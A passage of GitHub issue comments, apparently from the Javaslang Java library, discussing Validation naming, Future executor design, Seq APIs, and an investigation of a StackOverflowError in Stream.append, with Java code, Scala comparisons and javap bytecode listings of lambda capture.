A])(f: => Validation[L, A => B]) = fa ap f\n@SuppressWarnings(\"unchecked\")\n@Override\ndefault <B> Validation<E, B> ap(Kind<Validation<E, ?>, ? extends Function<? super A, ? extends B>> f) {\n    return ap((Validation<E, ? extends Function<? super A, ? extends B>>) (Object) f);\n}\n\n}\n```\n. Thank you for the links! The builder looks good, I have no better alternative.\nDo they really combine their results with map. I thought combining takes place with |@|.\nI like the names Valid and Invalid instead of Success and Failure, like Cats does. It is a better distinction from Try.\n. After further reading I now understand how map2..n combine Validations. In fact these map ops are map in the context of given Validations.\n. Yes, I like the name combine and also ap. It prevents from possible future ambiguities of Applicative types that extend Function. You did a great job!\nHappy new year! :)\n. @enelson Good to hear :) I thought of you the last days. Thx, the New Year was huge, hope yours too. Looking forwards to the review!\n. I think we finished adding Validation. Implementing Value is another topic.\n. Towards #477 \n. Thx!!\n. Fixes #812 \n. Towards #477 \n. Towards #477 \n. Ah yes, we were bitten by the -Xlint:all -Werror compiler flags - the CI build currently does not compile because of the removed @SuppressWarnings.\nIt does not matter - I will pull your change and apply the changes we discussed in order to release RC1.\nIt's ok!\n. thx!\n. Hi Christer,\nthank you! I considered the ForkJoinPool.commonPool as default because Scala's default ExecutorContext.global is also backed by a ForkJoinPool. My goal is that Java and Scala developers can switch languages forth/back without much effort. The naming scheme (types and most methods in packages collection and control) is also aligned to Scala in Javaslang.\nYes, having an Executor instead of an ExecutorService would be much nicer. Currently we need the ExecutorService for our cancel-feature. The ExecutorService returns a Java Future which is cancelable. But you're right, it would be much nicer to implement the cancel-feature ourselves.\nBecause of interoperability with Java in general it is nice to use Java's interfaces. We do this already for functions, e.g. Function, Supplier, Predicate et. al.\nI will check it what we can do!\nMany thanks,\nDaniel\n. You're also right about it that a single-threaded ExecutorService would be the simplest solution we can imagine. But then it wouldn't make much sense to use Futures. The computations could be called directly because they are processed sequentially in a single-threaded context. We should use Java's default thread pool to obtain the simplest concurrent context we can imagine.\n. I will move this issue to 2.0.1 to save some time for investigation and re-design of Future. Release 2.0.0 will have a Future that takes ExecutorService instead of Executor because of the cancel feature we use.\nWe still have the opportunity to change the API in the way that it uses Executor instead of ExecutorService without breaking it. It would just widen the domain of accepted values.\n. @asevans48 thank you for using Javaslang! Which change do you exactly need in order to replace Scala with Javaslang. Our current Future already has a default ExecutorService.\nThe one change that will differ from Scala is #1530. Currently Scala runs onComplete handlers on a new thread. We plan to reuse the existing thread, which completed and uses no more CPU.\nI think you are already able to switch to Javaslang using our latest stable version 2.0.5.. To recap:\n\nin a fully async solution it forces an unnecessary context switch for each callback\n\nIn #1530 we will change Future's behavior and execute callbacks on the same thread by default (this will be configurable). Using the the same thread for both, result computation and callbacks, will reduce the possibility of deadlocks (e.g. when no more threads are available on the pool etc.). Providing a special API for the sync/async case is an interesting idea. We will think about it in #1530 .\n\nif you could get away with an Executor instead of an ExecutorService it would mean less overhead \n\nWe need the ExecutorService because we internally rely on java.util.concurrent.Future returned by submit().\n\nI think we can close this ticket now because some ideas are covered by #1530.\n. Please have a look at #484: 'Get Traversable and Seq right (towards clean Set and Map interface)'.\n\nSeq union(Seq that)\n\nInstead of Seq.union(Seq) we use Seq.appendAll(Iterable). It is more general. Please see #570: ' appendAll vs addAll vs union vs concat'\n. Great! I think @ruslansennov recently implemented startsWith in LinearSeq and IndexedSeq. It looks to me that there is no benefit to have a special IndexedSeq.startsWith. I agree to your suggestion to implement startsWith and endsWith within Seq.\n. Haha, very good\n. Yes, we should accept Iterable and have a shortcut for Seq (tested with instanceof for example)\n. @mvh77 I think you are right, let us use Seq as argument. If we think it has to be relaxed we can switch to Iterable later. The outher way (changing it from Iterable to Seq) is not possible without breaking the API.\nIt is the functional way to pass the argument which are expected. However, there are still methods where it makes sense to pass an Iterable, especially when there are no assumptions about the characteristics of the collection. Examples are filter and flatMap.\n. Thx @mvh77 for bringing this to Javaslang!\n. Wow, THAT. WAS. FAST. Thx!\n. Fixes #612 \n. I imported paelo into IntelliJ and started the ProfilingTest.stackOverflow() test method. Streaming just Strings and using concatenation as fold operation works fine (without StackOverflow):\njava\n@Test\npublic void stackOverflow() {\n    StringColumn.Builder columnBuilder = StringColumn.builder(ColumnIds.stringCol(\"test\"));\n    Function2<StringColumn.Builder, String, StringColumn.Builder> append = (b, s) -> b.add(s);\n//    StringColumn column = Stream.range(0, COUNT).map(String::valueOf).foldLeft(columnBuilder, append).build();\n    Stream.range(0, COUNT).peek(System.out::println).map(String::valueOf).foldLeft(\"\", String::concat);\n}\nNow I investigate which portion of the append Function leads to the exception in foldLeft...\n. Yes, it is now clear to me. The column builder also uses internally a Stream to accumulate strings. This is done by calling Stream.append. Because Stream is lazy, all append operations are 'rewinded' on the stack when finally calling build(). This leads to the StackOverflowException.\nI'm currently not sure, if we can do the final append for all elements in a lazy manner on a constant stack. I will check this...\n. This one is semantically equivalent and also leads to a StackOverflowError:\njava\nStream.range(0, 1_000_000).map(String::valueOf).foldLeft(Stream.empty(), Stream::append).mkString();\nThe equivalent Scala code looks like this:\nscala\nStream.from(0).take(1000000).map(_.toString).foldLeft(Stream(): Stream[String])(_ :+ _).mkString\nThe Scala-code surprisingly (for me) does compute the String on a constant stack! I've investigated the Scala implementation of Stream.append. It looks similar to our implementation. However, Scala has special language support for lazy values, denoted as => expression. Java does not have this and needs to call a Supplier function.\nI will further investigate, if we can provide an implementation that evaluates the Stream contents on constant Stack...\n. Note: While investigating how to omit the deferred recursion, I stumbled upon two places where the number of objects instantiated when creating/iterating streams can be improved.\nThe first place is the StreamIterator. We do not wrap the tail in a new Lazy here.\nThe second place is the Stream.Cons class. The tail does not need to be a Lazy object. Instead we should copy the internals of Lazy to Cons (supplier, value and an internal sychronized get method) to safe object instances/memory when constructing streams.\n. On lazy vals in Scala: http://docs.scala-lang.org/sips/pending/improved-lazy-val-initialization.html\n. Side-note: Independent of the StackOverflow we discuss here, the current append implementation does capture this when deferring the tail operations:\njava\n@Override\ndefault Stream<T> append(T element) {\n    return isEmpty() ? Stream.of(element) : new Cons<>(head(), () -> tail().append(element));\n}\nThe new tail of the Cons part is () -> this.tail().append(element), which means that this is captured! In other words, currently we capture the whole recursive Stream within every stream node (I think). This will have a negative effect on GC.\nExample (the Cons(0, () -> ...) is the same as this):\njava\n/*\n * Cons(0, () ->\n *     Cons(0, () ->\n *         Cons(0, () ->\n *             empty.tail().append(1))\n *         .tail().append(2))\n *     .tail().append(3))\n */\nStream.empty().append(0).append(1).append(2).append(3);\nTHIS LOOKS WRONG, because we have many copies of the head element 0.\nWe could prevent this by relaxing the laziness of append and pull the tail out of this:\njava\n@Override\ndefault Stream<T> append(T element) {\n    if (isEmpty()) {\n        return Stream.of(element);\n    } else {\n        final Stream<T> tail = tail(); // pull the tail out of this\n        return new Cons<>(head(), () -> tail.append(element));\n    }\n}\nUpdated Example (now we don't reference this any more):\njava\n/*\n * Cons(0, empty)\n * Cons(0, () -> empty.append(1))\n * Cons(0, () -> Cons(1, () -> empty.append(2)))\n * Cons(0, () -> Cons(1, () -> Cons(2, () -> empty.append(3))))\n */\nStream.empty().append(0).append(1).append(2).append(3);\nTHIS LOOKS BETTER, but the remaining question is, does the Stream remain lazy enough when evaluating the tail during append?\nThe last solution sketched is also the basis to solve the StackOverflowError. However, currently the StackOverflowError still occurs with this solution. Goal: We need to ensure, that the StreamIterator is able to pull the head elements one-by-one out of the Stream without recursing into the tail. Currently the recursion still takes place...\n. It looks to me that it does work for Scala (without producing a StackOverflowError) because Scala has tail-recursion optimization, i.e. constant stack recursion. Java does not have tail call optimization (yet). Does tail call optimization in Scala work also for call by name parameters? I think it should...\nIt seems also to me that the only solution to circumvent the recursive calls (and the resulting StackOverflowError) is to enqueue deferred tail operations.\nSolution: A Stream consists of a head, a lazy tail and an initially empty commands queue. The append operation creates a command Append(element) and enqueues it for later processing on the lazy tail.\nI will further investigate this tomorrow.\n\n(...) the Church-Turing thesis proves (...) that what is computable by recursive functions is computable by an iterative model (...) and vice versa.\n. Note: Without having solved the StackOverflow problem, I got the append method right in the manner that this is not captured any more:\n\njava\n@Override\ndefault Stream<T> append(T element) {\n    if (isEmpty()) {\n        return Stream.of(element);\n    } else {\n        final Supplier<Stream<T>> tailSupplier = ((Cons<T>) this).tailSupplier();\n        return new Cons<>(head(), () -> tailSupplier.get().append(element));\n    }\n}\nwhere Cons.tailSupplier is implemented as follows:\njava\n// releases the `this` instance when a lazy tail is needed\nSupplier<Stream<T>> tailSupplier() {\n    if (isTailEvaluated()) {\n        return () -> tail;\n    } else {\n        synchronized (this) {\n            return isTailEvaluated() ? () -> tail : tailSupplier;\n        }\n    }\n}\nUpdate: Also here it is not clear to me, whether the Supplier returned by tailSupplier does capture the this instance or not. tail and tailSupplier are instance variables of Cons, so either a copy is created when they are captured in the lambda () -> ... or references are passed. In the latter case a Cons instance is still needed. The former case makes no sense IMO because variables need to be effectively final. If they where copied, they don't have to be final - it would not matter... Many questions...\nCurrently it is not clear to me, what happens when a lambda does capture a local method variable, like within the append method shown above:\njava\nfinal Supplier<Stream<T>> tailSupplier = ((Cons<T>) this).tailSupplier();\nreturn new Cons<>(head(), () -> tailSupplier.get().append(element));\ntailSupplier is an object reference. The object resides on the heap, the reference resides on the stack, because it is a local method variable. If the lambda does capture it there are two possibilities:\n1. it stays on the stack\n2. it is copied somewhere else (on the heap?)\nIMO it will not be the first solution because the stack frame is abandoned when the method returns. To be further investigated, I'm on it...\n. To start a first analysis how Java behaves when capturing args I assembled some test methods:\n``` java\npublic class Test {\nfinal T instanceVar;\n\n//\n// 0: aload_0                           // this\n// 1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n// 4: aload_0                           // this\n// 5: aload_1                           // t\n// 6: putfield      #2                  // Field instanceVar:Ljava/lang/Object;\n// 9: return\n//\nTest(T t) {\n    this.instanceVar = t;\n}\n\n//\n// 0: invokedynamic #3,  0              // InvokeDynamic #0:get:()Ljava/util/function/Supplier;\n// 5: areturn\n//\npublic Supplier<T> simple() {\n    return () -> null;\n}\n\n//\n// 0: aload_0                           // this\n// 1: invokedynamic #4,  0              // InvokeDynamic #1:get:(Ltest/Test;)Ljava/util/function/Supplier;\n// 6: areturn\n//\npublic Supplier<T> instanceVar() {\n    return () -> instanceVar;\n}\n\n//\n// 0: aload_1                           // arg\n// 1: invokedynamic #5,  0              // InvokeDynamic #2:get:(Ljava/lang/Object;)Ljava/util/function/Supplier;\n// 6: areturn\n//\npublic Supplier<T> argument(T arg) {\n    return () -> arg;\n}\n\n//\n// 0: aload_1                           // arg\n// 1: astore_2\n// 2: aload_2                           // local\n// 3: invokedynamic #6,  0              // InvokeDynamic #3:get:(Ljava/lang/Object;)Ljava/util/function/Supplier;\n// 8: areturn\n//\npublic Supplier<T> local(T arg) {\n    final T local = arg;\n    return () -> local;\n}\n\n//\n// 0: aload_0                           // this\n// 1: invokedynamic #7,  0              // InvokeDynamic #4:get:(Ltest/Test;)Ljava/util/function/Supplier;\n// 6: areturn\n//\npublic Supplier<T> methodRef() {\n    return this::get;\n}\n\n//\n// 0: invokedynamic #8,  0              // InvokeDynamic #5:get:()Ljava/util/function/Supplier;\n// 5: areturn\n//\npublic Supplier<T> staticMethodRef() {\n    return Test::staticGet;\n}\n\n//\n// 0: aconst_null\n// 1: areturn\n//\nT get() {\n    return null;\n}\n\n//\n// 0: aconst_null\n// 1: areturn\n//\nstatic <T> T staticGet() {\n    return null;\n}\n\n}\n```\n. See also Java 8 Lambdas - A Peek Under the Hood and of cause The Java Virtual Machine Specification.\n. These give some insight what happens within the JVM when creating lambdas:\n- When does JVM decide to reuse old lambda?\n- Is method reference caching a good idea in Java 8?\n- Does a lambda expression create an object on the heap every time it's executed?\n- JLS8 / 15.27.4. Run-Time Evaluation of Lambda Expressions\n. A little test program to see what lambda argument capturing does:\n``` java\npackage test;\nimport java.util.function.Supplier;\npublic class Stream {\nfinal T head;\nStream<T> tail = null;\nSupplier<Stream<T>> tailSupplier;\n\nStream(T head, Supplier<Stream<T>> tailSupplier) {\n    this.head = head;\n    this.tailSupplier = tailSupplier;\n}\n\nStream<T> append(T element) {\n    final Supplier<Stream<T>> localTailSupplier = tailSupplier0();\n    return new Stream<>(head, () -> localTailSupplier.get().append(element));\n}\n\nSupplier<Stream<T>> tailSupplier0() {\n    return () -> tail;\n}\n\nSupplier<Stream<T>> tailSupplier1() {\n    final Stream<T> localTail = tail;\n    return () -> localTail;\n}\n\nSupplier<Stream<T>> tailSupplier2() {\n    return tailSupplier;\n}\n\n}\n```\nRunning javap -c -v Stream.class shows the following:\n``` java\nClassfile /Users/daniel/git/test/target/classes/test/Stream.class\n  Last modified Nov 22, 2015; size 2634 bytes\n  MD5 checksum 419fde93d46ddf9a6a5fcd2c2c60208f\n  Compiled from \"Stream.java\"\npublic class test.Stream extends java.lang.Object\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #13.#52        // java/lang/Object.\"\":()V\n   #2 = Fieldref           #6.#53         // test/Stream.tail:Ltest/Stream;\n   #3 = Fieldref           #6.#54         // test/Stream.head:Ljava/lang/Object;\n   #4 = Fieldref           #6.#55         // test/Stream.tailSupplier:Ljava/util/function/Supplier;\n   #5 = Methodref          #6.#56         // test/Stream.tailSupplier0:()Ljava/util/function/Supplier;\n   #6 = Class              #57            // test/Stream\n   #7 = InvokeDynamic      #0:#63         // #0:get:(Ljava/util/function/Supplier;Ljava/lang/Object;)Ljava/util/function/Supplier;\n   #8 = Methodref          #6.#64         // test/Stream.\"\":(Ljava/lang/Object;Ljava/util/function/Supplier;)V\n   #9 = InvokeDynamic      #1:#66         // #1:get:(Ltest/Stream;)Ljava/util/function/Supplier;\n  #10 = InvokeDynamic      #2:#66         // #2:get:(Ltest/Stream;)Ljava/util/function/Supplier;\n  #11 = InterfaceMethodref #68.#69        // java/util/function/Supplier.get:()Ljava/lang/Object;\n  #12 = Methodref          #6.#70         // test/Stream.append:(Ljava/lang/Object;)Ltest/Stream;\n  #13 = Class              #71            // java/lang/Object\n  #14 = Utf8               head\n  #15 = Utf8               Ljava/lang/Object;\n  #16 = Utf8               Signature\n  #17 = Utf8               TT;\n  #18 = Utf8               tail\n  #19 = Utf8               Ltest/Stream;\n  #20 = Utf8               Ltest/Stream;\n  #21 = Utf8               tailSupplier\n  #22 = Utf8               Ljava/util/function/Supplier;\n  #23 = Utf8               Ljava/util/function/Supplier;>;\n  #24 = Utf8               \n  #25 = Utf8               (Ljava/lang/Object;Ljava/util/function/Supplier;)V\n  #26 = Utf8               Code\n  #27 = Utf8               LineNumberTable\n  #28 = Utf8               LocalVariableTable\n  #29 = Utf8               this\n  #30 = Utf8               LocalVariableTypeTable\n  #31 = Utf8               (TT;Ljava/util/function/Supplier;>;)V\n  #32 = Utf8               append\n  #33 = Utf8               (Ljava/lang/Object;)Ltest/Stream;\n  #34 = Utf8               element\n  #35 = Utf8               localTailSupplier\n  #36 = Utf8               (TT;)Ltest/Stream;\n  #37 = Utf8               tailSupplier0\n  #38 = Utf8               ()Ljava/util/function/Supplier;\n  #39 = Utf8               ()Ljava/util/function/Supplier;>;\n  #40 = Utf8               tailSupplier1\n  #41 = Utf8               localTail\n  #42 = Utf8               tailSupplier2\n  #43 = Utf8               lambda$tailSupplier1$2\n  #44 = Utf8               (Ltest/Stream;)Ltest/Stream;\n  #45 = Utf8               lambda$tailSupplier0$1\n  #46 = Utf8               ()Ltest/Stream;\n  #47 = Utf8               lambda$append$0\n  #48 = Utf8               (Ljava/util/function/Supplier;Ljava/lang/Object;)Ltest/Stream;\n  #49 = Utf8               Ljava/lang/Object;\n  #50 = Utf8               SourceFile\n  #51 = Utf8               Stream.java\n  #52 = NameAndType        #24:#72        // \"\":()V\n  #53 = NameAndType        #18:#19        // tail:Ltest/Stream;\n  #54 = NameAndType        #14:#15        // head:Ljava/lang/Object;\n  #55 = NameAndType        #21:#22        // tailSupplier:Ljava/util/function/Supplier;\n  #56 = NameAndType        #37:#38        // tailSupplier0:()Ljava/util/function/Supplier;\n  #57 = Utf8               test/Stream\n  #58 = Utf8               BootstrapMethods\n  #59 = MethodHandle       #6:#73         // invokestatic java/lang/invoke/LambdaMetafactory.metafactory:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;\n  #60 = MethodType         #74            //  ()Ljava/lang/Object;\n  #61 = MethodHandle       #6:#75         // invokestatic test/Stream.lambda$append$0:(Ljava/util/function/Supplier;Ljava/lang/Object;)Ltest/Stream;\n  #62 = MethodType         #46            //  ()Ltest/Stream;\n  #63 = NameAndType        #76:#77        // get:(Ljava/util/function/Supplier;Ljava/lang/Object;)Ljava/util/function/Supplier;\n  #64 = NameAndType        #24:#25        // \"\":(Ljava/lang/Object;Ljava/util/function/Supplier;)V\n  #65 = MethodHandle       #7:#78         // invokespecial test/Stream.lambda$tailSupplier0$1:()Ltest/Stream;\n  #66 = NameAndType        #76:#79        // get:(Ltest/Stream;)Ljava/util/function/Supplier;\n  #67 = MethodHandle       #6:#80         // invokestatic test/Stream.lambda$tailSupplier1$2:(Ltest/Stream;)Ltest/Stream;\n  #68 = Class              #81            // java/util/function/Supplier\n  #69 = NameAndType        #76:#74        // get:()Ljava/lang/Object;\n  #70 = NameAndType        #32:#33        // append:(Ljava/lang/Object;)Ltest/Stream;\n  #71 = Utf8               java/lang/Object\n  #72 = Utf8               ()V\n  #73 = Methodref          #82.#83        // java/lang/invoke/LambdaMetafactory.metafactory:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;\n  #74 = Utf8               ()Ljava/lang/Object;\n  #75 = Methodref          #6.#84         // test/Stream.lambda$append$0:(Ljava/util/function/Supplier;Ljava/lang/Object;)Ltest/Stream;\n  #76 = Utf8               get\n  #77 = Utf8               (Ljava/util/function/Supplier;Ljava/lang/Object;)Ljava/util/function/Supplier;\n  #78 = Methodref          #6.#85         // test/Stream.lambda$tailSupplier0$1:()Ltest/Stream;\n  #79 = Utf8               (Ltest/Stream;)Ljava/util/function/Supplier;\n  #80 = Methodref          #6.#86         // test/Stream.lambda$tailSupplier1$2:(Ltest/Stream;)Ltest/Stream;\n  #81 = Utf8               java/util/function/Supplier\n  #82 = Class              #87            // java/lang/invoke/LambdaMetafactory\n  #83 = NameAndType        #88:#92        // metafactory:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;\n  #84 = NameAndType        #47:#48        // lambda$append$0:(Ljava/util/function/Supplier;Ljava/lang/Object;)Ltest/Stream;\n  #85 = NameAndType        #45:#46        // lambda$tailSupplier0$1:()Ltest/Stream;\n  #86 = NameAndType        #43:#44        // lambda$tailSupplier1$2:(Ltest/Stream;)Ltest/Stream;\n  #87 = Utf8               java/lang/invoke/LambdaMetafactory\n  #88 = Utf8               metafactory\n  #89 = Class              #94            // java/lang/invoke/MethodHandles$Lookup\n  #90 = Utf8               Lookup\n  #91 = Utf8               InnerClasses\n  #92 = Utf8               (Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;\n  #93 = Class              #95            // java/lang/invoke/MethodHandles\n  #94 = Utf8               java/lang/invoke/MethodHandles$Lookup\n  #95 = Utf8               java/lang/invoke/MethodHandles\n{\n  final T head;\n    descriptor: Ljava/lang/Object;\n    flags: ACC_FINAL\n    Signature: #17                          // TT;\ntest.Stream tail;\n    descriptor: Ltest/Stream;\n    flags:\n    Signature: #20                          // Ltest/Stream;\njava.util.function.Supplier> tailSupplier;\n    descriptor: Ljava/util/function/Supplier;\n    flags:\n    Signature: #23                          // Ljava/util/function/Supplier;>;\ntest.Stream(T, java.util.function.Supplier>);\n    descriptor: (Ljava/lang/Object;Ljava/util/function/Supplier;)V\n    flags:\n    Code:\n      stack=2, locals=3, args_size=3\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"\":()V\n         4: aload_0\n         5: aconst_null\n         6: putfield      #2                  // Field tail:Ltest/Stream;\n         9: aload_0\n        10: aload_1\n        11: putfield      #3                  // Field head:Ljava/lang/Object;\n        14: aload_0\n        15: aload_2\n        16: putfield      #4                  // Field tailSupplier:Ljava/util/function/Supplier;\n        19: return\n      LineNumberTable:\n        line 11: 0\n        line 8: 4\n        line 12: 9\n        line 13: 14\n        line 14: 19\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      20     0  this   Ltest/Stream;\n            0      20     1  head   Ljava/lang/Object;\n            0      20     2 tailSupplier   Ljava/util/function/Supplier;\n      LocalVariableTypeTable:\n        Start  Length  Slot  Name   Signature\n            0      20     0  this   Ltest/Stream;\n            0      20     1  head   TT;\n            0      20     2 tailSupplier   Ljava/util/function/Supplier;>;\n    Signature: #31                          // (TT;Ljava/util/function/Supplier;>;)V\ntest.Stream append(T);\n    descriptor: (Ljava/lang/Object;)Ltest/Stream;\n    flags:\n    Code:\n      stack=5, locals=3, args_size=2\n         0: aload_0\n         1: invokevirtual #5                  // Method tailSupplier0:()Ljava/util/function/Supplier;\n         4: astore_2\n         5: new           #6                  // class test/Stream\n         8: dup\n         9: aload_0\n        10: getfield      #3                  // Field head:Ljava/lang/Object;\n        13: aload_2\n        14: aload_1\n        15: invokedynamic #7,  0              // InvokeDynamic #0:get:(Ljava/util/function/Supplier;Ljava/lang/Object;)Ljava/util/function/Supplier;\n        20: invokespecial #8                  // Method \"\":(Ljava/lang/Object;Ljava/util/function/Supplier;)V\n        23: areturn\n      LineNumberTable:\n        line 17: 0\n        line 18: 5\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      24     0  this   Ltest/Stream;\n            0      24     1 element   Ljava/lang/Object;\n            5      19     2 localTailSupplier   Ljava/util/function/Supplier;\n      LocalVariableTypeTable:\n        Start  Length  Slot  Name   Signature\n            0      24     0  this   Ltest/Stream;\n            0      24     1 element   TT;\n            5      19     2 localTailSupplier   Ljava/util/function/Supplier;>;\n    Signature: #36                          // (TT;)Ltest/Stream;\njava.util.function.Supplier> tailSupplier0();\n    descriptor: ()Ljava/util/function/Supplier;\n    flags:\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokedynamic #9,  0              // InvokeDynamic #1:get:(Ltest/Stream;)Ljava/util/function/Supplier;\n         6: areturn\n      LineNumberTable:\n        line 22: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       7     0  this   Ltest/Stream;\n      LocalVariableTypeTable:\n        Start  Length  Slot  Name   Signature\n            0       7     0  this   Ltest/Stream;\n    Signature: #39                          // ()Ljava/util/function/Supplier;>;\njava.util.function.Supplier> tailSupplier1();\n    descriptor: ()Ljava/util/function/Supplier;\n    flags:\n    Code:\n      stack=1, locals=2, args_size=1\n         0: aload_0\n         1: getfield      #2                  // Field tail:Ltest/Stream;\n         4: astore_1\n         5: aload_1\n         6: invokedynamic #10,  0             // InvokeDynamic #2:get:(Ltest/Stream;)Ljava/util/function/Supplier;\n        11: areturn\n      LineNumberTable:\n        line 26: 0\n        line 27: 5\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      12     0  this   Ltest/Stream;\n            5       7     1 localTail   Ltest/Stream;\n      LocalVariableTypeTable:\n        Start  Length  Slot  Name   Signature\n            0      12     0  this   Ltest/Stream;\n            5       7     1 localTail   Ltest/Stream;\n    Signature: #39                          // ()Ljava/util/function/Supplier;>;\njava.util.function.Supplier> tailSupplier2();\n    descriptor: ()Ljava/util/function/Supplier;\n    flags:\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: getfield      #4                  // Field tailSupplier:Ljava/util/function/Supplier;\n         4: areturn\n      LineNumberTable:\n        line 31: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Ltest/Stream;\n      LocalVariableTypeTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Ltest/Stream;\n    Signature: #39                          // ()Ljava/util/function/Supplier;>;\n}\nSignature: #49                          // Ljava/lang/Object;\nSourceFile: \"Stream.java\"\nInnerClasses:\n     public static final #90= #89 of #93; //Lookup=class java/lang/invoke/MethodHandles$Lookup of class java/lang/invoke/MethodHandles\nBootstrapMethods:\n  0: #59 invokestatic java/lang/invoke/LambdaMetafactory.metafactory:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;\n    Method arguments:\n      #60 ()Ljava/lang/Object;\n      #61 invokestatic test/Stream.lambda$append$0:(Ljava/util/function/Supplier;Ljava/lang/Object;)Ltest/Stream;\n      #62 ()Ltest/Stream;\n  1: #59 invokestatic java/lang/invoke/LambdaMetafactory.metafactory:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;\n    Method arguments:\n      #60 ()Ljava/lang/Object;\n      #65 invokespecial test/Stream.lambda$tailSupplier0$1:()Ltest/Stream;\n      #62 ()Ltest/Stream;\n  2: #59 invokestatic java/lang/invoke/LambdaMetafactory.metafactory:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;\n    Method arguments:\n      #60 ()Ljava/lang/Object;\n      #67 invokestatic test/Stream.lambda$tailSupplier1$2:(Ltest/Stream;)Ltest/Stream;\n      #62 ()Ltest/Stream;\n``\n. We see that capturing an instance variable in a lambda will passthisto the [lambda meta factory](https://docs.oracle.com/javase/8/docs/api/java/lang/invoke/LambdaMetafactory.html). A new function object is created which implements the functional interfaceSupplier>. It is called viainvokespecial. This is bad because we do not want to capturethis` of the outer context.\nExample:\n``` java\nclass Stream {\n    Stream tail = null;\nSupplier<Stream<T>> go() {\n    // the lambda factory generates a call site which captures `this`\n    return () -> tail;\n}\n\n}\n```\nAdding a local variable on the operand stack which holds the instance variable reference makes a difference. The functional interface is now called via invokestatic (preferred way). However, it is not part of the JVM specification how implementations have to generate the bytecode. Other compiler implementations may do it in a different way.\nExample:\n``` java\nclass Stream {\n    Stream tail = null;\nSupplier<Stream<T>> go() {\n    final Stream<T> localTail = tail;\n    // the lambda factory generates a call site which does not capture `this`\n    return () -> localTail;\n}\n\n}\n```\nThis is what I can see - but I'm no JVM / bytecode expert, so I may be wrong.\n. Of cause this issue has implications on all new Cons(head, () -> tail()...) calls. The () -> tail()... part needs to be () -> tailSupplier.get()... in order not to capture this.\n. I think not all optimizations I did the last few days are completely correct. In particular using a tail supplier Supplier<Stream<T>> instead of a lazy tail Lazy<Stream<T>> may produce unexpected results if the tail supplier is not referential transparent. We need to ensure that the tail is at most evaluated once. Currently the changes to append result in unexpected behavior.\nThis works fine:\njava\n@Test\npublic void shouldEvaluateTailAtMostOnce() {\n    final int[] counter = { 0 };\n    final Stream<Integer> stream = Stream.gen(() -> counter[0]++);\n    final Stream<Integer> tail = stream.tail();\n    final String expected = stream.drop(1).take(3).mkString(\",\");\n    final String actual= tail.take(3).mkString(\",\");\n    assertThat(expected).isEqualTo(\"1,2,3\");\n    assertThat(actual).isEqualTo(expected);\n}\nAppending one element to the infinite sequence of tail elements produces a wrong result:\njava\n@Test\npublic void shouldEvaluateTailAtMostOnce() {\n    // ...\n    final Stream<Integer> tail = stream.tail().append(100);\n    // ...\n    // org.junit.ComparisonFailure: \n    // Expected :\"1,2,3\"\n    // Actual   :\"1,5,6\"\n}\nConclusion: We need to switch back to out initial Lazy<Stream<T>> tail within Stream.Cons but ensure that this is not captured in lambdas.\nUpdate: Fixed with #836\n. See also Iterator.dropRight as example for deferring an operation.\n. @netzwerg your finding is a good point. The problem is understood but currently I have no solution. I will move this issue to 2.0.1. The Stream operations that encapsulate operations for later execution need to be documented accordingly. A Stream is meant to handle infinite sequences rather than doing heavy bulk operations. There are other data structures for that kind of application.\nThx for testing! :)\n. @netzwerg thank you - coffee makes it possible :-)\nI have a solution in mind. There are Stream Cons and Empty. Operations on Empty will evaluate immediately. Operations on Cons will go to an internal Queue. That will be the key to sequence operations instead of recursively cascading them. But I need time to prototype and test it.\n. Hi Ruslan, incredible that it works!\nSlow down - the Javaslang types need to remain algebraic data types (ADT), otherwise a Scala-like unapply will not work. In other words to the outside we still need Empty and Cons. Maybe Cons can't be final then and Append extends Cons.\nOne question haunts me... Why does append work for Scala on constant stack?\njava\n// copied from Scala's Stream\ndef append[B >: A](rest: => TraversableOnce[B]): Stream[B] =\n  if (isEmpty) rest.toStream else cons(head, tail append rest)\nIs it the call by name rest : => ...?\nWhat happens there 'under the hood'?\n. I also question if Stream should implement a more memory consuming append at all. Is Stream, which is like a memoizing Iterator, really the right collection to append millions of elements? A Stream maybe has a different purpose.\n. You have sketched a working solution. That is great.\nYou're right about correct serialization - that needs to be ensured.\nMmhh, Scala's append must be somehow tail recursive. But I can't 